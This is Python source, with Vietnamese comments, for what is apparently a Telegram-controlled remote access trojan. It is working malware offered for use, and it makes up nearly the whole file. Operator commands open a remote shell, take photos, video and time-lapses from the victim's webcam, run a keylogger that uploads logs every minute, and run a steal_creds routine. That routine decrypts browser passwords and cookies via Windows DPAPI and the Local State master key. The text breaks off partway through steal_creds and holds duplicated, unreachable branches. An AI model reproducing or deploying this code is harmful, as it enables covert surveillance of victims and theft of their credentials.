async def shell_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Kh·ªüi t·∫°o shell"""
    keyboard = [
        [InlineKeyboardButton("üñ•Ô∏è B·∫Øt ƒë·∫ßu Shell", callback_data="start_shell")],
        [InlineKeyboardButton("‚ùå D·ª´ng Shell", callback_data="stop_shell")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "üñ•Ô∏è Command Shell:\n"
        "‚Ä¢ B·∫Øt ƒë·∫ßu: M·ªü shell ƒë·ªÉ th·ª±c thi l·ªánh\n"
        "‚Ä¢ D·ª´ng: ƒê√≥ng shell v√† ng·∫Øt k·∫øt n·ªëi",
        reply_markup=reply_markup
    )

@require_auth
async def handle_shell(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """X·ª≠ l√Ω shell"""
    global is_shell_active
    query = update.callback_query
    await query.answer()
    
    try:
        if query.data == "start_shell":
            if is_shell_active:
                await query.answer("Shell ƒëang ch·∫°y!", show_alert=True)
                return
                
            is_shell_active = True
            message = await query.message.reply_text(
                "üîÑ ƒêang kh·ªüi ƒë·ªông shell...\n\nG√µ l·ªánh ƒë·ªÉ th·ª±c thi:"
            )
            
            # L∆∞u message_id ƒë·ªÉ theo d√µi nh·∫≠p l·ªánh
            context.user_data['shell_message'] = message.message_id
            context.user_data['waiting_for'] = 'shell_command'
            
        elif query.data == "stop_shell":
            is_shell_active = False
            context.user_data['waiting_for'] = None
            await query.edit_message_text("‚ùå ƒê√£ ƒë√≥ng shell")
            
    except Exception as e:
        await query.message.reply_text(f"‚ùå L·ªói: {str(e)}")

async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """X·ª≠ l√Ω tin nh·∫Øn vƒÉn b·∫£n"""
    if not context.user_data.get('waiting_for'):
        return

    try:
        message_text = update.message.text
        
        if context.user_data['waiting_for'] == 'shell_command':
            if not is_shell_active:
                await update.message.reply_text("‚ùå Shell ƒë√£ ƒë√≥ng!")
                context.user_data['waiting_for'] = None
                return
                
            try:
                # Th·ª±c thi l·ªánh shell
                process = await asyncio.create_subprocess_shell(
                    message_text,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, stderr = await process.communicate()
                
                # G·ª≠i k·∫øt qu·∫£
                if stdout:
                    out = stdout.decode()
                    await update.message.reply_text(f"üì§ Output:\n{out}")
                if stderr:
                    err = stderr.decode()
                    await update.message.reply_text(f"‚ùå Error:\n{err}")
                    
            except Exception as e:
                await update.message.reply_text(f"‚ùå L·ªói th·ª±c thi: {str(e)}")
            return
            
        # X√≥a tr·∫°ng th√°i ch·ªù cho c√°c tr∆∞·ªùng h·ª£p kh√°c
        context.user_data['waiting_for'] = None
        
    except Exception as e:
        await update.message.reply_text(f"‚ùå L·ªói: {str(e)}")

# Th√™m h√†m ƒëi·ªÅu khi·ªÉn webcam
@require_auth
async def webcam_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Kh·ªüi t·∫°o c√°c gi√° tr·ªã m·∫∑c ƒë·ªãnh cho webcam
    if 'webcam_res' not in context.user_data:
        context.user_data['webcam_res'] = '720p'  # 720p, 1080p
    if 'webcam_effect' not in context.user_data:
        context.user_data['webcam_effect'] = 'none'  # none, gray, blur, edge
    if 'webcam_duration' not in context.user_data:
        context.user_data['webcam_duration'] = 30  # Th·ªùi gian quay video (gi√¢y)
    if 'webcam_id' not in context.user_data:
        context.user_data['webcam_id'] = 0  # ID c·ªßa webcam ƒëang s·ª≠ d·ª•ng

    keyboard = [
        [
            InlineKeyboardButton("üì∏ Ch·ª•p ·∫£nh", callback_data="webcam_photo"),
            InlineKeyboardButton("üé• Quay video", callback_data="webcam_video")
        ],
        [
            InlineKeyboardButton("‚è± Time-lapse", callback_data="webcam_timelapse"),
            InlineKeyboardButton("üîÑ ƒê·ªïi camera", callback_data="webcam_switch")
        ],
        [
            InlineKeyboardButton("üé® Hi·ªáu ·ª©ng", callback_data="webcam_effect"),
            InlineKeyboardButton("‚öôÔ∏è ƒê·ªô ph√¢n gi·∫£i", callback_data="webcam_res")
        ],
        [
            InlineKeyboardButton("‚¨ÜÔ∏è Th·ªùi gian +30s", callback_data="duration_up"),
            InlineKeyboardButton("‚¨áÔ∏è Th·ªùi gian -30s", callback_data="duration_down")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    current_res = context.user_data['webcam_res']
    current_effect = context.user_data['webcam_effect']
    current_duration = context.user_data['webcam_duration']
    current_cam = context.user_data['webcam_id']

    await update.message.reply_text(
        f"ƒêi·ªÅu khi·ªÉn Webcam:\n\n"
        f"üìπ Camera: {current_cam}\n"
        f"üñ• ƒê·ªô ph√¢n gi·∫£i: {current_res}\n"
        f"üé® Hi·ªáu ·ª©ng: {current_effect}\n"
        f"‚è± Th·ªùi gian quay: {current_duration}s\n\n"
        f"‚Ä¢ Ch·ª•p ·∫£nh: Ch·ª•p v√† g·ª≠i m·ªôt ·∫£nh\n"
        f"‚Ä¢ Quay video: Quay video v·ªõi th·ªùi gian t√πy ch·ªânh\n"
        f"‚Ä¢ Time-lapse: Ch·ª•p ·∫£nh theo kho·∫£ng th·ªùi gian\n"
        f"‚Ä¢ Hi·ªáu ·ª©ng: none, gray, blur, edge",
        reply_markup=reply_markup
    )

# Th√™m h√†m x·ª≠ l√Ω c√°c n√∫t ƒëi·ªÅu khi·ªÉn webcam
# H√†m √°p d·ª•ng hi·ªáu ·ª©ng cho frame
def apply_effect(frame, effect):
    if effect == 'gray':
        return cv2.cvtColor(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY), cv2.COLOR_GRAY2BGR)
    elif effect == 'blur':
        return cv2.GaussianBlur(frame, (15, 15), 0)
    elif effect == 'edge':
        edges = cv2.Canny(frame, 100, 200)
        return cv2.cvtColor(edges, cv2.COLOR_GRAY2BGR)
    return frame

async def handle_webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_recording, webcam_task
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat_id
    
    try:
        # X·ª≠ l√Ω c√°c t√πy ch·ªçn webcam
        if query.data == "webcam_switch":
            # Chuy·ªÉn ƒë·ªïi gi·ªØa c√°c webcam
            available_cams = [i for i in range(5) if cv2.VideoCapture(i).isOpened()]
            if not available_cams:
                await query.answer("‚ùå Kh√¥ng t√¨m th·∫•y webcam n√†o!", show_alert=True)
                return
            current_cam = context.user_data['webcam_id']
            next_cam = (current_cam + 1) % len(available_cams)
            context.user_data['webcam_id'] = next_cam
            await query.answer(f"üîÑ ƒê√£ chuy·ªÉn sang camera {next_cam}")
            
        elif query.data == "webcam_effect":
            # ƒê·ªïi hi·ªáu ·ª©ng
            effects = ['none', 'gray', 'blur', 'edge']
            current_effect = context.user_data['webcam_effect']
            next_effect = effects[(effects.index(current_effect) + 1) % len(effects)]
            context.user_data['webcam_effect'] = next_effect
            await query.answer(f"üé® ƒê√£ ƒë·ªïi hi·ªáu ·ª©ng: {next_effect}")
            
        elif query.data == "webcam_res":
            # ƒê·ªïi ƒë·ªô ph√¢n gi·∫£i
            resolutions = ['480p', '720p', '1080p']
            current_res = context.user_data['webcam_res']
            next_res = resolutions[(resolutions.index(current_res) + 1) % len(resolutions)]
            context.user_data['webcam_res'] = next_res
            await query.answer(f"‚öôÔ∏è ƒê√£ ƒë·ªïi ƒë·ªô ph√¢n gi·∫£i: {next_res}")
            
        elif query.data == "duration_up":
            # TƒÉng th·ªùi gian quay
            context.user_data['webcam_duration'] = min(300, context.user_data['webcam_duration'] + 30)
            await query.answer(f"‚è± Th·ªùi gian quay: {context.user_data['webcam_duration']}s")
            
        elif query.data == "webcam_photo":
            # Ch·ª•p ·∫£nh v·ªõi c√°c t√πy ch·ªçn hi·ªán t·∫°i
            cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
            if not cap.isOpened():
                await query.edit_message_text("‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi webcam!")
                return

            # Thi·∫øt l·∫≠p ƒë·ªô ph√¢n gi·∫£i
            res_map = {
                '480p': (640, 480),
                '720p': (1280, 720),
                '1080p': (1920, 1080)
            }
            width, height = res_map[context.user_data['webcam_res']]
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)

            # Ch·ª•p ·∫£nh
            ret, frame = cap.read()
            cap.release()

            if not ret:
                await query.edit_message_text("‚ùå Kh√¥ng th·ªÉ ch·ª•p ·∫£nh!")
                return

            # √Åp d·ª•ng hi·ªáu ·ª©ng
            frame = apply_effect(frame, context.user_data['webcam_effect'])

            # Chuy·ªÉn ƒë·ªïi v√† g·ª≠i ·∫£nh
            _, buffer = cv2.imencode('.jpg', frame)
            bio = BytesIO(buffer)
            bio.seek(0)
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=bio,
                caption=f"üì∏ ·∫¢nh t·ª´ webcam\nüñ• ƒê·ªô ph√¢n gi·∫£i: {context.user_data['webcam_res']}\nüé® Hi·ªáu ·ª©ng: {context.user_data['webcam_effect']}"
            )

        elif query.data == "webcam_video":
            if is_recording:
                await query.answer("üé• ƒêang quay video!", show_alert=True)
                return

            async def record_video():
                global is_recording
                try:
                    is_recording = True
                    duration = context.user_data['webcam_duration']
                    res_map = {
                        '480p': (640, 480),
                        '720p': (1280, 720),
                        '1080p': (1920, 1080)
                    }
                    width, height = res_map[context.user_data['webcam_res']]
                    temp_video = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.mp4")
                    
                    cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        await context.bot.send_message(chat_id, "‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi webcam!")
                        return

                    # Thi·∫øt l·∫≠p ƒë·ªô ph√¢n gi·∫£i v√† FPS
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                    fps = 30
                    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
                    out = cv2.VideoWriter(temp_video, fourcc, fps, (width, height))

                    start_time = time.time()
                    frames = 0
                    
                    while is_recording and time.time() - start_time < duration:
                        ret, frame = cap.read()
                        if not ret:
                            break

                        # √Åp d·ª•ng hi·ªáu ·ª©ng
                        frame = apply_effect(frame, context.user_data['webcam_effect'])
                        
                        out.write(frame)
                        frames += 1
                        await asyncio.sleep(1/fps)  # ƒê·∫£m b·∫£o FPS ·ªïn ƒë·ªãnh

                    cap.release()
                    out.release()

                    if os.path.exists(temp_video) and frames > 0:
                        # G·ª≠i video
                        with open(temp_video, 'rb') as video:
                            await context.bot.send_video(
                                chat_id=chat_id,
                                video=video,
                                caption=f"üé• Video t·ª´ webcam\n‚è± Th·ªùi gian: {duration}s\nüñ• ƒê·ªô ph√¢n gi·∫£i: {context.user_data['webcam_res']}\nüé® Hi·ªáu ·ª©ng: {context.user_data['webcam_effect']}"
                            )
                        os.remove(temp_video)
                    else:
                        await context.bot.send_message(chat_id, "‚ùå L·ªói khi quay video!")

                except Exception as e:
                    print(f"L·ªói khi quay video: {e}")
                    await context.bot.send_message(chat_id, f"‚ùå L·ªói: {str(e)}")
                finally:
                    is_recording = False
                    try:
                        cap.release()
                        out.release()
                    except:
                        pass

            webcam_task = asyncio.create_task(record_video())

        elif query.data == "webcam_timelapse":
            if is_recording:
                await query.answer("üé• ƒêang ghi h√¨nh!", show_alert=True)
                return

            async def capture_timelapse():
                global is_recording
                try:
                    is_recording = True
                    duration = context.user_data['webcam_duration']
                    interval = 1  # Ch·ª•p m·ªói gi√¢y
                    frames = []
                    
                    cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        await context.bot.send_message(chat_id, "‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi webcam!")
                        return

                    # Thi·∫øt l·∫≠p ƒë·ªô ph√¢n gi·∫£i
                    res_map = {
                        '480p': (640, 480),
                        '720p': (1280, 720),
                        '1080p': (1920, 1080)
                    }
                    width, height = res_map[context.user_data['webcam_res']]
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)

                    start_time = time.time()
                    while is_recording and time.time() - start_time < duration:
                        ret, frame = cap.read()
                        if not ret:
                            break

                        # √Åp d·ª•ng hi·ªáu ·ª©ng
                        frame = apply_effect(frame, context.user_data['webcam_effect'])
                        frames.append(frame)
                        await asyncio.sleep(interval)

                    cap.release()

                    if frames:
                        # T·∫°o video t·ª´ c√°c frame
                        temp_video = os.path.join(TEMP_DIR, f"timelapse_{int(time.time())}.mp4")
                        out = cv2.VideoWriter(temp_video, cv2.VideoWriter_fourcc(*'mp4v'), 10, (width, height))
                        
                        for frame in frames:
                            out.write(frame)
                        out.release()

                        # G·ª≠i video
                        with open(temp_video, 'rb') as video:
                            await context.bot.send_video(
                                chat_id=chat_id,
                                video=video,
                                caption=f"‚è± Time-lapse video\nüïí Th·ªùi gian: {duration}s\nüì∏ S·ªë ·∫£nh: {len(frames)}\nüñ• ƒê·ªô ph√¢n gi·∫£i: {context.user_data['webcam_res']}\nüé® Hi·ªáu ·ª©ng: {context.user_data['webcam_effect']}"
                            )
                        os.remove(temp_video)
                    else:
                        await context.bot.send_message(chat_id, "‚ùå Kh√¥ng c√≥ frame n√†o ƒë∆∞·ª£c ch·ª•p!")

                except Exception as e:
                    print(f"L·ªói khi t·∫°o time-lapse: {e}")
                    await context.bot.send_message(chat_id, f"‚ùå L·ªói: {str(e)}")
                finally:
                    is_recording = False
                    try:
                        cap.release()
                    except:
                        pass

            webcam_task = asyncio.create_task(capture_timelapse())

        elif query.data == "duration_down":
            # Gi·∫£m th·ªùi gian quay
            context.user_data['webcam_duration'] = max(10, context.user_data['webcam_duration'] - 30)
            await query.answer(f"‚è± Th·ªùi gian quay: {context.user_data['webcam_duration']}s")
            
        elif query.data == "webcam_photo":
            # Ch·ª•p ·∫£nh v·ªõi c√°c t√πy ch·ªçn hi·ªán t·∫°i
            cap = cv2.VideoCapture(context.user_data['webcam_id'], cv2.CAP_DSHOW)
            if not cap.isOpened():
                await query.edit_message_text("‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi webcam!")
                return
                return
            
            # C·∫•u h√¨nh webcam Full HD
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 1920)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 1080)
            cap.set(cv2.CAP_PROP_FPS, 60)
            cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
            cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 1)
            
            # Ch·ª•p nhi·ªÅu frame ƒë·ªÉ l·∫•y ·∫£nh t·ªët nh·∫•t
            frames = []
            for _ in range(5):
                ret, frame = cap.read()
                if ret:
                    frames.append(frame)
                await asyncio.sleep(0.1)
            
            cap.release()
            
            if not frames:
                await query.edit_message_text("‚ùå Kh√¥ng th·ªÉ ch·ª•p ·∫£nh!")
                return

            # Ch·ªçn frame s·∫Øc n√©t nh·∫•t
            best_frame = max(frames, key=cv2.Laplacian(cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY), cv2.CV_64F).var())
            
            # X·ª≠ l√Ω ·∫£nh n√¢ng cao
            frame = cv2.fastNlMeansDenoisingColored(best_frame, None, 10, 10, 7, 21)
            frame = cv2.detailEnhance(frame, sigma_s=10, sigma_r=0.15)

            # Face detection
            face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
            faces = face_cascade.detectMultiScale(gray, 1.3, 5)
            
            # V·∫Ω khung face detect
            for (x,y,w,h) in faces:
                cv2.rectangle(frame, (x,y), (x+w,y+h), (255,0,0), 2)

            # Chuy·ªÉn frame th√†nh bytes ch·∫•t l∆∞·ª£ng cao
            params = [cv2.IMWRITE_JPEG_QUALITY, 100]
            _, img_encoded = cv2.imencode('.jpg', frame, params)
            img_bytes = BytesIO(img_encoded.tobytes())

            await context.bot.send_photo(
                chat_id=query.message.chat_id,
                photo=img_bytes,
                caption="üì∏ ·∫¢nh t·ª´ webcam"
            )
            await query.answer("‚úÖ ƒê√£ ch·ª•p ·∫£nh th√†nh c√¥ng!", show_alert=True)

        elif query.data == "webcam_video":
            if is_recording:
                await query.answer("ƒêang quay video!", show_alert=True)
                return

            async def record_video():
                global is_recording
                cap = None
                try:
                    cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                    if not cap.isOpened():
                        await query.edit_message_text("‚ùå Kh√¥ng th·ªÉ k·∫øt n·ªëi webcam!")
                        return

                    # C·∫•u h√¨nh webcam ch·∫•t l∆∞·ª£ng cao
                    width = 1920  # Full HD
                    height = 1080
                    fps = 60
                    cap.set(cv2.CAP_PROP_FRAME_WIDTH, width)
                    cap.set(cv2.CAP_PROP_FRAME_HEIGHT, height)
                    cap.set(cv2.CAP_PROP_FPS, fps)
                    cap.set(cv2.CAP_PROP_FOURCC, cv2.VideoWriter_fourcc(*'MJPG'))
                    cap.set(cv2.CAP_PROP_AUTOFOCUS, 1)
                    cap.set(cv2.CAP_PROP_AUTO_EXPOSURE, 1)

                    # T·∫°o video writer H.264 ch·∫•t l∆∞·ª£ng cao
                    fourcc = cv2.VideoWriter_fourcc(*'avc1')
                    temp_video = 'temp_video.mp4'
                    video_writer = cv2.VideoWriter(temp_video, fourcc, fps, (width, height))

                    # Face detection
                    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')
                    
                    # Motion detection
                    previous_frame = None
                    motion_threshold = 30

                    start_time = time.time()
                    frame_count = 0
                    is_recording = True
                    
                    # Quay ƒë·ªß 30 * fps frames ƒë·ªÉ ƒë∆∞·ª£c video 30s
                    required_frames = 30 * fps
                    
                    while is_recording and frame_count < required_frames:
                        ret, frame = cap.read()
                        if ret:
                            # Motion detection
                            gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                            if previous_frame is not None:
                                diff = cv2.absdiff(previous_frame, gray)
                                if diff.mean() > motion_threshold:
                                    # TƒÉng ƒë·ªô s·∫Øc n√©t khi c√≥ chuy·ªÉn ƒë·ªông
                                    frame = cv2.detailEnhance(frame, sigma_s=10, sigma_r=0.15)
                            previous_frame = gray.copy()

                            # Face detection
                            faces = face_cascade.detectMultiScale(gray, 1.3, 5)
                            for (x,y,w,h) in faces:
                                cv2.rectangle(frame, (x,y), (x+w,y+h), (255,0,0), 2)

                            # X·ª≠ l√Ω frame
                            frame = cv2.fastNlMeansDenoisingColored(frame, None, 10, 10, 7, 21)
                            
                            video_writer.write(frame)
                            frame_count += 1
                            
                            # C·∫≠p nh·∫≠t ti·∫øn ƒë·ªô m·ªói 30 frames (kho·∫£ng 1 gi√¢y v·ªõi 30fps)
                            if frame_count % 30 == 0:
                                try:
                                    elapsed_seconds = frame_count // fps
                                    remaining_seconds = 30 - elapsed_seconds
                                    progress = (frame_count / required_frames) * 100
                                    
                                    await query.edit_message_text(
                                        f"üé• ƒêang quay video...\n"
                                        f"Th·ªùi gian: {elapsed_seconds}/30s\n"
                                        f"Ti·∫øn ƒë·ªô: {progress:.1f}% ({frame_count}/{required_frames} frames)"
                                    )
                                except:
                                    pass

                        await asyncio.sleep(0.001)  # Gi·∫£m thi·ªÉu delay

                    is_recording = False
                    if cap:
                        cap.release()
                    video_writer.release()

                    # G·ª≠i video
                    if os.path.exists(temp_video) and os.path.getsize(temp_video) > 0:
                        with open(temp_video, 'rb') as video:
                            await context.bot.send_video(
                                chat_id=query.message.chat_id,
                                video=video,
                                filename=f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.mp4",
                                caption=f"üé• Video t·ª´ webcam ({frame_count/fps:.1f}s)",
                                supports_streaming=True
                            )
                        os.remove(temp_video)
                        await query.edit_message_text(
                            f"‚úÖ ƒê√£ g·ª≠i video th√†nh c√¥ng!\n"
                            f"Th·ªùi gian: {frame_count/fps:.1f}s ({frame_count} frames)"
                        )
                    else:
                        await query.edit_message_text("‚ùå Kh√¥ng th·ªÉ t·∫°o video!")

                except Exception as e:
                    await query.edit_message_text(f"‚ùå L·ªói: {str(e)}")
                finally:
                    is_recording = False
                    if cap and cap.isOpened():
                        cap.release()
                    try:
                        if os.path.exists(temp_video):
                            os.remove(temp_video)
                    except:
                        pass
                    cv2.destroyAllWindows()

            webcam_task = asyncio.create_task(record_video())
            await query.answer("B·∫Øt ƒë·∫ßu quay video...", show_alert=True)

        elif query.data == "stop_recording":
            if not is_recording:
                await query.answer("Kh√¥ng c√≥ video ƒëang quay!", show_alert=True)
                return
                
            is_recording = False
            if webcam_task:
                try:
                    webcam_task.cancel()
                except:
                    pass
                webcam_task = None
            await query.answer("ƒê√£ d·ª´ng quay video!", show_alert=True)

    except Exception as e:
        await query.edit_message_text(f"‚ùå L·ªói: {str(e)}")

# Th√™m h√†m x·ª≠ l√Ω keylogger
@require_auth
async def keylogger_control(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("‚ñ∂Ô∏è B·∫Øt ƒë·∫ßu", callback_data="start_logging"),
            InlineKeyboardButton("‚èπ D·ª´ng", callback_data="stop_logging")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "üîë ƒêi·ªÅu khi·ªÉn Keylogger:\n"
        "‚Ä¢ B·∫Øt ƒë·∫ßu: B·∫Øt ƒë·∫ßu ghi v√† g·ª≠i log m·ªói ph√∫t\n"
        "‚Ä¢ D·ª´ng: D·ª´ng ghi log",
        reply_markup=reply_markup
    )

# Th√™m h√†m g·ª≠i log ƒë·ªãnh k·ª≥
async def send_log_periodically(context: ContextTypes.DEFAULT_TYPE, chat_id: int):
    global key_logs, is_logging
    while is_logging:
        await asyncio.sleep(log_interval)
        if not is_logging:  # Ki·ªÉm tra l·∫°i sau khi ƒë·ª£i
            break
        if key_logs and any(log.strip() for log in key_logs):  # Ch·ªâ g·ª≠i khi c√≥ log
            try:
                # L·ªçc b·ªè c√°c d√≤ng tr·ªëng
                filtered_logs = [log for log in key_logs if log.strip()]
                
                if filtered_logs:  # Ki·ªÉm tra l·∫°i sau khi l·ªçc
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    log_text = "\n".join(filtered_logs)
                    log_bytes = BytesIO(log_text.encode('utf-8'))
                    
                    await context.bot.send_document(
                        chat_id=chat_id,
                        document=log_bytes,
                        filename=f"keylog_{timestamp}.txt",
                        caption="üìù Log ph√≠m trong 1 ph√∫t qua"
                    )
                    
                key_logs = [""]  # Reset log v·ªõi m·ªôt d√≤ng tr·ªëng
                
            except Exception as e:
                print(f"L·ªói khi g·ª≠i log: {e}")

# S·ª≠a l·∫°i h√†m x·ª≠ l√Ω c√°c n√∫t ƒëi·ªÅu khi·ªÉn keylogger
async def handle_keylogger(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_logging, key_logs, log_thread
    query = update.callback_query
    await query.answer()

    try:
        if query.data == "start_logging":
            if is_logging:
                await query.answer("Keylogger ƒëang ch·∫°y!", show_alert=True)
                return

            is_logging = True
            key_logs = [""]  # Kh·ªüi t·∫°o v·ªõi m·ªôt d√≤ng tr·ªëng
            log_thread = threading.Thread(target=start_keylogger)
            log_thread.start()
            asyncio.create_task(send_log_periodically(context, query.message.chat_id))
            await query.message.reply_text("‚úÖ ƒê√£ b·∫Øt ƒë·∫ßu ghi log")

        elif query.data == "stop_logging":
            if not is_logging:
                await query.answer("Keylogger ƒë√£ d·ª´ng!", show_alert=True)
                return

            is_logging = False
            if log_thread and log_thread.is_alive():
                log_thread.join(timeout=1)
            
            # G·ª≠i log cu·ªëi c√πng n·∫øu c√≥ n·ªôi dung
            if key_logs and any(log.strip() for log in key_logs):
                filtered_logs = [log for log in key_logs if log.strip()]
                if filtered_logs:
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    log_text = "\n".join(filtered_logs)
                    log_bytes = BytesIO(log_text.encode('utf-8'))
                    
                    await context.bot.send_document(
                        chat_id=query.message.chat_id,
                        document=log_bytes,
                        filename=f"keylog_{timestamp}.txt",
                        caption="üìù Log ph√≠m cu·ªëi c√πng"
                    )
                    
            key_logs = []  # X√≥a to√†n b·ªô log
            await query.message.reply_text("‚èπ ƒê√£ d·ª´ng ghi log")

    except Exception as e:
        print(f"L·ªói keylogger: {e}")
        await query.message.reply_text(f"‚ùå L·ªói: {str(e)}")

# Th√™m c√°c h√†m x·ª≠ l√Ω m√£ h√≥a v√† gi·∫£i m√£
def decrypt_blob(blob_out):
    """Gi·∫£i m√£ gi√° tr·ªã t·ª´ DATA_BLOB"""
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def decrypt_windows_dpapi(encrypted_bytes, entropy=b''):
    """Gi·∫£i m√£ d·ªØ li·ªáu ƒë∆∞·ª£c b·∫£o v·ªá b·∫±ng DPAPI c·ªßa Windows"""
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy))
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return decrypt_blob(blob_out)
    return None

def decrypt_browser_value(encrypted_value, master_key):
    """Gi·∫£i m√£ gi√° tr·ªã ƒë∆∞·ª£c l∆∞u tr·ªØ trong tr√¨nh duy·ªát (m·∫≠t kh·∫©u/cookie)"""
    try:
        # Ki·ªÉm tra phi√™n b·∫£n m√£ h√≥a
        if isinstance(encrypted_value, bytes):
            # Ki·ªÉm tra xem c√≥ ph·∫£i ƒë·ªãnh d·∫°ng AES-GCM kh√¥ng
            if encrypted_value[:3] == b'v10' or encrypted_value[:3] == b'v11':
                iv = encrypted_value[3:15]
                payload = encrypted_value[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_value = cipher.decrypt(payload)
                # B·ªè 16 byte MAC ·ªü cu·ªëi
                decrypted_value = decrypted_value[:-16]
                try:
                    return decrypted_value.decode()
                except UnicodeDecodeError:
                    return decrypted_value
            else:
                # ƒê·ªãnh d·∫°ng m√£ h√≥a kh√°c ho·∫∑c kh√¥ng m√£ h√≥a
                return decrypt_windows_dpapi(encrypted_value)
    except Exception as e:
        print(f"L·ªói khi gi·∫£i m√£: {e}")
    return "<Kh√¥ng th·ªÉ gi·∫£i m√£>"

def create_temp_db_copy(source_path, temp_dir):
    """T·∫°o b·∫£n sao t·∫°m th·ªùi c·ªßa t·ªáp c∆° s·ªü d·ªØ li·ªáu ƒë·ªÉ tr√°nh kh√≥a t·ªáp"""
    rand_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(20))
    filename = os.path.join(temp_dir, f"{rand_name}.db")
    shutil.copy2(source_path, filename)
    return filename

def get_master_key(browser_path):
    """L·∫•y master key t·ª´ t·ªáp Local State c·ªßa tr√¨nh duy·ªát"""
    try:
        local_state_path = os.path.join(browser_path, "Local State")
        if not os.path.exists(local_state_path):
            print(f"L·ªói: File Local State kh√¥ng t·ªìn t·∫°i t·∫°i {local_state_path}")
            return None
            
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
        except PermissionError:
            print(f"L·ªói: Kh√¥ng c√≥ quy·ªÅn ƒë·ªçc file {local_state_path}")
            print("Vui l√≤ng ch·∫°y v·ªõi quy·ªÅn administrator")
            return None
        except json.JSONDecodeError:
            print(f"L·ªói: File Local State kh√¥ng ƒë√∫ng ƒë·ªãnh d·∫°ng JSON")
            return None
            
        try:
            encrypted_key = local_state["os_crypt"]["encrypted_key"]
        except KeyError:
            print("L·ªói: Kh√¥ng t√¨m th·∫•y encrypted_key trong Local State")
            return None
            
        try:
            if not encrypted_key:
                print("L·ªói: encrypted_key tr·ªëng")
                return None
                
            encrypted_key = b64decode(encrypted_key)
            encrypted_key = encrypted_key[5:]  # Remove 'DPAPI' prefix
            decrypted_key = decrypt_windows_dpapi(encrypted_key)
            if not decrypted_key:
                print("L·ªói: Kh√¥ng th·ªÉ gi·∫£i m√£ master key")
                return None
            return decrypted_key
            
        except Exception as e:
            print(f"L·ªói khi gi·∫£i m√£ master key: {str(e)}")
            return None
            
    except Exception as e:
        print(f"L·ªói kh√¥ng x√°c ƒë·ªãnh khi l·∫•y master key: {str(e)}")
        return None

@require_auth
async def steal_creds(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Thu th·∫≠p th√¥ng tin ƒëƒÉng nh·∫≠p, cookie, l·ªãch s·ª≠ v√† t·∫£i xu·ªëng t·ª´ tr√¨nh duy·ªát"""
    try:
        await update.message.reply_text("üîç ƒêang thu th·∫≠p th√¥ng tin t·ª´ tr√¨nh duy·ªát...")
        
        # Kh·ªüi t·∫°o d·ªØ li·ªáu
        data = {
            'passwords': {'items': [], 'count': 0, 'domains': []},
            'cookies': {'items': [], 'count': 0},
            'history': {'items': [], 'count': 0},
            'downloads': {'items': [], 'count': 0}
        }
        
        # T·∫°o th∆∞ m·ª•c t·∫°m th·ªùi
        temp_dir = os.path.join(TEMP_DIR, PC_NAME)
        os.makedirs(temp_dir, exist_ok=True)
        
        # T√¨m c√°c tr√¨nh duy·ªát ƒë√£ c√†i ƒë·∫∑t
        browsers = detect_browsers()
        
